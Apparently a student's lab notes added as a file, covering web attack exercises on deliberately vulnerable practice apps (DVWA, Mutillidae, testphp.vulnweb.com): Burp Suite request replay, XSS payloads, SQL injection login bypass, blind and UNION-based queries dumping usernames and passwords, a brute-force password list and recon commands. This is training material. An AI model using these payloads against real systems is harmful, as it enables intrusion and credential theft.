@@ -1,0 +1,210 @@
+Identify and Manage vulnerabilities by Crawling the web application using Burp Spider/Site Map
+
+•	sudo apt update
+•	sudo apt install dvwa -y
+•	dvwa-start
+•	Login – admin / password 
+•	Dvwa Secuirty Level – Low 
+•	Open burp suite 
+•	Open burp suite browser go to webite login and select anything in that 
+•	Send any task to repeater 
+•	Send to security level low 
+Change this line:
+•	GET /vulnerabilities/xss_r/ HTTP/1.1
+To this line (injecting the payload):
+GET/vulnerabilities/xss_r/?name=<script>alert(document.domain)</script>&Submit=Submit HTTP/1.1
+•	Click send 
+In response panel right click and request in browser and copy url and paste in new tab 
+
+
+--------------------------------------------------------------------------------
+
+
+Identify and Manage vulnerabilities by Replaying web requests using the Repeater tab.
+
+•	sudo apt update
+•	sudo apt install dvwa -y
+•	dvwa-start
+•	Login – admin / password 
+•	Dvwa Secuirty Level – Low 
+•	Open Xss dom and sql injection 
+•	Go to site map
+•	Right-click /vulnerabilities/xss_r/ → Send to Repeater.
+•	Change this line 
+GET /vulnerabilities/xss_r/?name=<script>alert(1)</script>&Submit=Submit HTTP/1.1
+•	Click send 
+•	In response panel right click and request in browser and copy url and paste in new tab 
+•	Open Sql Injection send to repeater 
+•	Then first do this 
+GET /vulnerabilities/sqli/?id=1%27&Submit=Submit HTTP/1.1
+GET /vulnerabilities/sqli/?id=1%27%20OR%20%271%27%3D%271&Submit=Submit HTTP/1.1
+GET /vulnerabilities/sqli/?id=1%20UNION%20SELECT%20null,version(),null--%20-&Submit=Submit HTTP/1.1
+•	In response panel right click and request in browser and copy url and paste in new tab 
+
+
+--------------------------------------------------------------------------------
+
+
+identify the target web application and gather relevant information such as the application's technology stack, URLs, endpoints, and any other publicly available information.
+
+
+
+whatweb testphp.vulnweb.com
+dirb testphp.vulnweb.com
+whois youtube.com
+nmap -sV -sC testphp.vulnweb.com
+ping -c 4 testphp.vulnweb.com
+dig Wikipedia.org A
+dig Wikipedia.org MX
+dig Wikipedia.org NS
+assestfinder Wikipedia.org
+
+
+--------------------------------------------------------------------------------
+
+Use open-source intelligence (OSINT) techniques to gather information about the application, its infrastructure, and potential vulnerabilities.
+whatweb testphp.vulnweb.com
+dirb testphp.vulnweb.com
+whois youtube.com
+nmap -sV -sC testphp.vulnweb.com
+ping -c 4 testphp.vulnweb.com
+dig Wikipedia.org A
+dig Wikipedia.org MX
+dig Wikipedia.org NS
+assestfinder Wikipedia.org
+
+--------------------------------------------------------------------------------
+
+Identify Session Management Vulnerabilities in Mutillidae/DVWA
+
+
+Open dvwa then go to login in page 
+Open burp suite then on intercept and login send that post request to repeater 
+
+Than chanage the cookie to fixsess12345 then turn off intercept send the response open in tab and login with id pass check the console 
+
+
+
+--------------------------------------------------------------------------------
+
+Identify Brute forcing the authentication of Mutillidae/DVWA
+Start DVWA 
+Open in burp suite browser and then login go to burte force then turn on target intercept send to intruder 
+Make password 
+password
+123456
+admin
+letmein
+qwerty
+password1
+12345
+welcome
+12345678
+admin123 
+
+use sniper 
+
+--------------------------------------------------------------------------------
+
+Detecting XSS Vulnerabilities in web application 1. Perform reflected XSS attack and stored XSS attack using Mutillidae/DVWA
+
+Reflected
+L0:<script>alert('XSS')</Script>
+L1:<scriPt>alert('XSS')</sCrIpt>
+L2:<img src=x onerror=alert(1)>
+
+Stored
+L0:<script>alert(document.domain)</script>
+L1:<img src=x onerror=alert(document.cookie)>
+L2:<body onload=alert('Bugbot19')>
+
+--------------------------------------------------------------------------------
+
+Examine SQL Injection: Bypassing Authentication using SQL injection
+
+Go to http://testphp.vulnweb.com/userinfo.php 
+then open in burp suite borwser 
+login with random user name and password 
+in burp suite send to repeater 
+remove username and password replace with this 
+uname=' OR '1'='1' -- -&pass=
+uname=admin&pass=' OR '1'='1' -- -
+
+then send and check
+
+--------------------------------------------------------------------------------
+
+Examine SQL Injection: Blind SQL injection
+Go to dwvm ‘
+Sql injection (blind)
+Put = 1 – (Normal Request (Baseline Output))
+Put = 1' AND 1=1- -   ( Boolean TRUE condition)
+Put = 1' AND 1=2-- (  Boolean FALSE condition) 
+Put = 1' AND SLEEP(5)--   (Time-Based Blind SQL)
+
+Open burp suite – go to proxy http history send sql injection to repeater change first line to 
+GET /vulnerabilities/sqli_blind/?id=1'%20AND%20SLEEP(5)--%20&Submit=Submit HTTP/1.1 
+
+for time based blind sql
+
+--------------------------------------------------------------------------------
+
+
+Examine SQL Injection: Extracting Data using the UNION attack
+1.	Set DVWA Security Level:
+Go to DVWA Security → Set security level to Low.
+2.	Open the Vulnerable Page:
+URL: http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit
+3.	Find Maximum Number of Columns:
+Enter the following payloads one by one in the User ID field until an error occurs:
+1' ORDER BY 1-- -
+1' ORDER BY 2-- -
+1' ORDER BY 3-- -
+➤ The highest number before the error = number of columns.
+(Here, maximum column = 2)
+4.	Find Which Column is Reflected:
+Test both payloads:
+1' UNION SELECT 'FOO',NULL-- -
+1' UNION SELECT NULL,'FOO'-- -
+➤ The column showing “FOO” is the reflected column.
+5.	Get the Current Database Name:
+o	If first column reflected:
+1' UNION SELECT DATABASE(),NULL-- -
+o	If second column reflected:
+1' UNION SELECT NULL,DATABASE()-- -
+➤ Database name = dvwa
+	6.	List All Tables in the Database:
+	o	If first column reflected:
+1' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema=DATABASE()-- -
+	o	If second column reflected:
+1' UNION SELECT NULL,table_name FROM information_schema.tables WHERE table_schema=DATABASE()-- -
+	➤ Tables found = users, guestbook
+
+
+	7.	List All Columns in ‘users’ Table:
+	o	If first column reflected:
+1' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'-- -
+	o	If second column reflected:
+1' UNION SELECT NULL,column_name FROM information_schema.columns WHERE table_name='users'-- -
+	➤ Columns found = user_id, first_name, last_name, user, password, avatar, 	last_login, failed_login
+	8.	Extract Usernames and Passwords:
+	o	If first column reflected:
+1' UNION SELECT CONCAT(user,0x3a,password),NULL FROM users-- -
+	o	If second column reflected:
+1' UNION SELECT NULL,CONCAT(user,0x3a,password) FROM users-- -
+9.	Extract Rows One by One (Optional):
+1' UNION SELECT CONCAT(user,0x3a,password),NULL FROM users LIMIT 0,1-- -
+1' UNION SELECT CONCAT(user,0x3a,password),NULL FROM users LIMIT 1,1-- -
+1' UNION SELECT CONCAT(user,0x3a,password),NULL FROM users LIMIT 2,1-- -
+10.	Extract Data from ‘guestbook’ Table (Optional):
+1' UNION SELECT CONCAT(name,0x3a,comment),NULL FROM guestbook-- -
+11.	If Type Error Occurs (Optional):
+1' UNION SELECT CAST(CONCAT(user,0x3a,password) AS CHAR),NULL FROM users-- -
+
+
+
+
+
+
+--------------------------------------------------------------------------------
+
